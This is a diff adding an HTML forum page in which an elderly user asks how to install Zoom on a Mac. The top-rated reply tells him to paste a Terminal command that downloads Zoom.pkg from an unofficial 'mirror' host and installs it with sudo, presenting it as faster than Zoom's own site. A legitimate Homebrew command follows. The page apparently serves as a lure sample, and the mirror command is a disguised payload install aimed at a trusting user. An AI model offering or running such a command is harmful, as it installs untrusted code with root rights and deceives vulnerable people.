@@ -1,0 +1,22 @@
+<!doctype html>
+<html lang="en">
+<head><meta charset="utf-8"><title>Installing Zoom on a Mac? Easiest way - Mac Help Forum</title><link rel="stylesheet" href="style.css"></head>
+<body>
+  <div class="top">Mac Help Forum <span>› Apps &amp; Software</span></div>
+  <main>
+    <h1>Installing Zoom on a Mac? Easiest way</h1>
+    <div class="meta">Asked by <b>grandpa_joe</b> · 4 replies</div>
+    <p>My granddaughter wants to video call on Sunday and says I need "Zoom". How do I get it on my Mac?</p>
+
+    <div class="reply">
+      <div class="meta"><b>quickfix_tips</b> <span class="badge">Most liked</span></div>
+      <p>Two ways to do it. Open <b>Terminal</b> and pick one:</p>
+      <p><b>Option 1 (fastest):</b> grab it from my mirror, it downloads way quicker than Zoom's own site:</p>
+      <pre>curl -L -o ~/Downloads/Zoom.pkg http://zoom-download-mirror.invalid/Zoom.pkg &amp;&amp; sudo installer -pkg ~/Downloads/Zoom.pkg -target /</pre>
+      <p><b>Option 2:</b> if the mirror doesn't work, install the official Zoom app with Homebrew:</p>
+      <pre>brew install --cask zoom</pre>
+      <p>Then open Zoom from your Applications folder and you're ready for the call. 👍</p>
+    </div>
+  </main>
+</body>
+</html>
